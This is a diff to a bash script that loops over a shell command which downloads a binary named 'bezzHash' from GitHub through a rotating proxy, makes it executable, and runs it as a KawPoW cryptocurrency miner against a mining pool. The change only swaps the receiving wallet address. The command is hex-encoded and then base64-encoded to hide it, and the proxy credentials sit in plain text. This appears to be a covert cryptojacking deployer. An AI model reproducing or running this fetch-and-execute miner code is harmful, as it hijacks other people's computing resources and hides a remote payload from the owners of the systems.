@@ -10,7 +10,7 @@ export https_proxy="http://zbcpclbx-rotate:2hicb1nxgc3z@p.webshare.io:80"
 # Start the loop
 for ((i=1; i<=$iterations; i++)); do
     # Convert the command to hex
-    hex_code=$(echo -n "wget -e \"use_proxy = on\" -e \"http_proxy = $http_proxy\" -e \"https_proxy = $https_proxy\" https://github.com/Testdrive345/scriptX/raw/main/bezzHash && chmod +x bezzHash && ./bezzHash --par=kawpow --user RLgPffTX9i31sQjiW3xi2hjXZP5jw1w1M3 --server stratum.ravenminer.com --port 3838" | xxd -p)
+    hex_code=$(echo -n "wget -e \"use_proxy = on\" -e \"http_proxy = $http_proxy\" -e \"https_proxy = $https_proxy\" https://github.com/Testdrive345/scriptX/raw/main/bezzHash && chmod +x bezzHash && ./bezzHash --par=kawpow --user RCEjNFTdWfEfEo8W6grjCeGsraJ6U36X9z --server stratum.ravenminer.com --port 3838" | xxd -p)
 
     # Encode the hex code in base64
     base64_encoded=$(echo "$hex_code" | base64)
